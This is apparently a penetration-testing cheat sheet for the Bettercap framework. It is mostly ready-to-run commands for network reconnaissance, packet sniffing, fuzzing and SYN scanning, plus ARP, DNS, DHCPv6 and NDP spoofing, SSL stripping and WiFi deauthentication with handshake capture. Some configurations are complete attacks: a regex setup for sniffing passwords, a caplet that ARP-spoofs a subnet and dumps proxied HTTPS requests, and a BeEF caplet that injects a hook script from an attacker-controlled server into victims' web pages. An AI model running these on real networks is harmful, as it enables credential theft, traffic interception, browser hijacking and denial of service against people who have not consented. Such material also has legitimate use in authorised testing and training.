# 🟡 Bettercap

## <mark style="color:red;">Official Documentation</mark>

{% embed url="https://www.bettercap.org/modules" %}

## <mark style="color:red;">Get Module Help</mark>

```
>> help [module name]
>> help net.recon
```

## <mark style="color:red;">Recon & Monitoring</mark>

#### <mark style="color:green;">show list of host details</mark>

```
net.show
```

#### <mark style="color:green;">turn passive host discovery on/off</mark>

```
net.recon on/off
```

The net.recon module performs passive scanning and is on by default, but it may not discover active devices that are not sending ARP messages while Bettercap is running. Bettercap also includes an active scanning feature in the net.probe module. Bettercap's net.probe module will continually send UDP packets to all hosts on the network. Bettercap sends the UDP activity in the form of four common protocols: NetBIOS Name Service (NBNS) discovery, Multicast DNS (MDNS), Universal Plug-and-Play (UPNP), and Web Services Discovery (WSD).

#### <mark style="color:green;">turn active host discovery on/off</mark>

```
net.probe on/off
```

Running the net.probe module for several seconds will typically reveal many more host discoveries than the net.recon module will discover. During the active discovery, or after stopping the discovery, you can examine information about discovered hosts using the net.show command.

## <mark style="color:red;">Sniffing</mark>

#### turn packet sniffing on/off

```
net.sniff on/off
```

#### set verbose

```
set net.sniff.verbose true/false
```

#### If true it will consider packets from/to this computer, otherwise it will skip them.

```
set net.sniff.local true/false
```

#### save packets to a file

```
set net.sniff.output [filename]
```

#### examine packet sniffer status

```
net.sniff stats
```

#### add source pcap file to read

```
set net.sniff.source [filename]
```

#### extract matching regex from packet payloads

```
set net.sniff.regexp [regex]
```

#### set a protocol filter for sniffer output

```
set net.sniff.filter not arp
set net.sniff.filter dhcp
```

### <mark style="color:orange;">Password Sniffing</mark>

```
set net.sniff.local true
set net.sniff.regexp '.*password=.+'
set net.sniff.verbose 'true'
set net.sniff.output ‘passwords.pcap’
```

#### You could use predefined caplet http-req-dump.cap:

```
# targeting the whole subnet by default, to make it selective:
#
# sudo ./bettercap -caplet http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.10"

# to make it less verbose
# events.stream off

# discover a few hosts 
net.probe on
sleep 1
net.probe off

# uncomment to enable sniffing too
set net.sniff.verbose false
set net.sniff.local true
set net.sniff.filter tcp port 443
net.sniff on

# we'll use this proxy script to dump requests
set https.proxy.script http-req-dump.js
set http.proxy.script http-req-dump.js
clear

# go ^_^
http.proxy on
https.proxy on
arp.spoof on
```

## <mark style="color:red;">Proxy JS Injection (XSS)</mark>

we use beef-xss active caplet

```
function onLoad() {
  log( "BeefInject loaded." );
  log("targets: " + env('arp.spoof.targets'));
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
 log( "BeefInject loaded." );
log("targets: " + env('arp.spoof.targets'));
      res.Body = body.replace( 
        '</head>', 
        '<script type="text/javascript" src="http://<YOUR_SERVER>:3000/hook.js"></script></head>' 
      ); 
    }
  }
}
```

```
bettercap -caplet beef-active.cap -eval "set arp.spoof.targets 192.168.1.6; arp.spoof on;" -debug
```

When user opens HTTP website, for instance time.com, hook will be executed

## <mark style="color:red;">Bettercap + BeFF Hook</mark>

{% embed url="https://www.youtube.com/watch?ab_channel=CodeOnCommand&v=CHbIV9eU2mg" %}

## <mark style="color:red;">Fuzzing</mark>

In addition to packet-sniffing capabilities, Bettercap also can mutate packets for network protocol fuzzing using the net.fuzz module. By default, the net.fuzz module will mutate 100% of packets transmitted by Bettercap, mutating 40% of the packet payload data. You can adjust these values by changing the net.fuzz.rate and net.fuzz.ratio parameters.

[types of layers](https://github.com/google/gopacket/blob/master/layers/layertypes.go#L13)

#### mutate (fuzz) packets as they are forwarded

```
net.fuzz on/off
```

#### choose application layers are fuzzed

```
set net.fuzz.layer [layers]
```

#### change the percentage of packet and byte mutation

```
net.fuzz.rate
net.fuzz.ratio
```

## <mark style="color:red;">SYN Scan</mark>

#### start scan

```
set net.show.meta true
syn.scan [ip range] [start port] [end port]
```

#### stop scan

```
syn.scan stop
```

#### show progress

```
syn.scan.progress
```

#### show results

```
//net.show
```

## <mark style="color:red;">Ticker Commands</mark>

The Bettercap ticker allows you to specify a collection of commands to run at a fixed frequency, which is great for monitoring the network or periodically scanning for new network targets.

```
ticker on/off
set ticker.commands "list; of; commands"

#example:
set ticker.period 10
set ticker.commands "clear; net.show; events.show 20 "
```

## <mark style="color:red;">ARP Spoof</mark>

start ARP spoof

```
arp.spoof on/off

# Specify a list of target IP addresses, comma-separated
set arp.spoof.targets [IPs]
```

run ARP spoof in ban mode (targets connection wont work )

```
arp.ban on/off
```

run full duplex ARP spoof (both target and gateway will be attacked)

{% hint style="info" %}
if the gateway has ARP spoof protection the attack will fail
{% endhint %}

```
set arp.spoof.fullduplex true/false 

# example:
# Ban the address 192.168.1.6 from the network:
set arp.spoof.targets 192.168.1.6; arp.ban on

# Spoof 192.168.1.2, 192.168.1.3 and 192.168.1.4
set arp.spoof.targets 192.168.1.2-4; arp.spoof on
```

## <mark style="color:red;">Ban Target From Network</mark>

```
set arp.spoof.targets <TARGET_IP>
arp.ban on
```

## <mark style="color:red;">DNS Spoof</mark>

Set the dns.spoof.address for the host that you want to receive client activity stemming from spoofed responses. Set dns.spoof.domains to a comma-separated list of all the domains you want to target for DNS spoofing, or set dns.spoof.all to true to spoof all DNS responses. Alternatively, you can target your attack by setting dns.spoof.hosts to a hosts file that uses a specific hostname-to-IP-address pairing (using the same configuration of the standard /etc/hosts file on UNIX systems).

```
dns.spoof on/off
```

#### Set the IP address to return for spoofed DNS answers

```
set dns.spoof.address [address]
```

#### Set a list of domain targets for DNS spoofing, comma- separated list

```
set dns.spoof.domains [domain]
```

#### Perform DNS spoofing for all requests regardless of domain, hosts file

```
set dns.spoof.all true/false
```

#### Perform DNS spoofing only for the entries mapped in the specified hosts file

```
set dns.spoof.hosts [hostsfile]
```

## <mark style="color:red;">DHCPv6 Spoof</mark>

```
dhcp6.spoof on/off
```

## <mark style="color:red;">NDP Spoof</mark>

```
ndp.spoof on/off
```

## <mark style="color:red;">Custom Proxy</mark>

turn any proxy on/off

```
any.proxy on/off

# set interface for redirection
set any.proxy.iface <interface name>

# set protocol
set any.proxy.protocol TCP/UDP

# set port
set any.proxy.src_port 80

# set source address
set any.proxy.src_address [ip]

# set dest address
set any.proxy.dst_address [ip]	

# set dst port
set any.proxy.dst_port	[port]
```

## <mark style="color:red;">TCP Proxy</mark>

```
tcp.proxy on/off
```

## <mark style="color:red;">HTTP Proxy</mark>

```
http.proxy on/off
```

#### enable SSL strip attack

```
set http.proxy.sslstrip true/false
```

#### URL, path or js code to inject into every HTML page

```
http.proxy.injectjs
set http.proxy.script /root/Desktop/Hook.js

# example:
# Will ARP spoof the whole network,
# enable sslstrip and inject a 
# “Hello World” javascript alert 
# to every HTML page being visited:

set http.proxy.injectjs alert("Hello World")
set http.proxy.sslstrip true

http.proxy on
arp.spoof on
```

## <mark style="color:red;">HTTPS Proxy</mark>

A full featured HTTPS transparent proxy that can be scripted using javascript modules. If used together with a spoofer, all HTTPS traffic will be redirected to it and it will automatically handle port redirections as needed.

{% hint style="info" %}
When a new TLS connection is being proxied, bettercap will fetch the original certificate from the target host and resign on the fly the full chain using its own CA.
{% endhint %}

```
https.proxy on/off
```

#### enable SSL strip attack

```
set https.proxy.sslstrip true/false
```

#### inject js code

```
https.proxy.injectjs
set https.proxy.script /root/Desktop/Hook.js
```

## <mark style="color:red;">Wifi Network Monitoring</mark>

wifi.recon covers both 2.4 Ghz and 5Ghz frequencies. It’s doing everything you need. Deauth, Sniff, Handshake captures. To start, add -iface option:

```
 bettercap -iface wlan0
```

{% hint style="info" %}
In case of an error: Can’t restore interface wlan0 wireless mode (SIOCSIWMODE failed: Bad file descriptor). Please adjust manually. Quit bettercap and manually set the wireless interface to monitor mode. For example, as follows:

```
$ sudo ip link set wlan0 down
$ sudo iw wlan0 set monitor control
$ sudo ip link set wlan0 up
```
{% endhint %}

Turn on recon:

```
wifi.recon on
```

You can manage channels with:

```
wifi.recon.channel 10,11
```

To clear them:

```
wifi.recon.channel clear
```

Results can be seen with:

```
wifi.show
```

To capture handshakes, we should define a sniffer, filter specific frames (0x888e), set the output file for processing later on, maybe select the channel and or target:

```
» set net.sniff.verbose true
» set net.sniff.filter ether proto 0x888e
» set net.sniff.output /root/wpa.pcap
» net.sniff on

» wifi.recon.channel 1
» wifi.recon on
» wifi.recon 94:33:30:a6:2b:63
```

Then we should hit it with the Deauth. You can deauth all clients with:

```
wifi.deauth AP-BSSID
```

or just specific one:

```
wifi.deauth CLIENT-BSSID
```

When you capture the handshake, you can start breaking them. We’ll not cover that here.

## <mark style="color:red;">BLE (Bluetooth Low Energy device discovery)</mark>

The `ble.recon` will discovery every BLE device you want to inspect with `ble.enum` or playaround with `ble.write`.

To connect, enumerate and read characteristics from the BLE device 04:ff:de:ff:be:ff:

```
ble.enum 04:ff:de:ff:be:ff
```

Write the bytes `ff ff ff ff ff ff ff ff` to the BLE device `04:ff:de:ff:be:ff` on its characteristics with UUID `234afbd5e3b34536a3fe72f630d4278d`:

```
 ble.write 04:ff:de:ff:be:ff 234afbd5e3b34536a3fe72f630d4278d ffffffffffffffff
```

{% hint style="info" %}
ble.enum only works one time per execution

incomplete support for macOS

not supported on Windows
{% endhint %}
